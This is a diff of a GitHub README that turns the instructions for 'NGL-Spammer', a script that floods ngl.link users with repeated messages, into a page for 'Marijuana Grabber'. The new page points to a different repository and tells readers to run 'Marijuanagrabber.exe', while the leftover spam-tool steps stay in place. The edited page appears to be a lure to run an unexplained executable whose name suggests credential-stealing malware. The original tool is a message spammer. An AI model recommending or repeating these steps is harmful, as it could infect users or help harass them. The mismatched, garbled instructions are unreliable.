@@ -1,5 +1,5 @@
-# NGL-Spammer
-This Python script is used to automatically send messages to [ngl.link](https://ngl.link) service. It sends a specified message to a given username a certain number of times.
+# Marijuana Grabber
+
 
 ## Requirements
 
@@ -9,17 +9,10 @@ This Python script is used to automatically send messages to [ngl.link](https://
 
 1. download this code:
    ```bash
-   git clone https://github.com/0MeMo07/NGL-Spammer.git
-2. Go to NGL-Spammer file:
-    ```bash
+   git clone https://github.com/9BAYA77/Marijuana-Grabber
+2. Go to marijuana grabber file:
+    ```run file : Marijuanagrabber.exe
      cd NGL-Spammer
-3. Install the required libraries by running the following command:
-    ```bash
-    pip install -r requirements.txt
-4. NGLSpamer.py Run:
-     ```bash
-     python NGLSpamer.py
-## Usage
 
 1. Enter your username.
 2. Enter the message you want to send.
@@ -29,9 +22,5 @@ The script will automatically start sending the specified message to the given u
 
 If there are 10 consecutive unsuccessful submissions, the script will wait for 5 seconds and then continue with the retry process.
 
-## Screenshots
-![image](https://github.com/0MeMo07/NGL-Spammer/assets/103096364/edba601d-7367-413c-94b5-44cb26b98759)
 
 ## Support me
-
-<a href="https://www.buymeacoffee.com/SmakeMeMo" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/black_img.png" alt="Buy Me A Coffee">
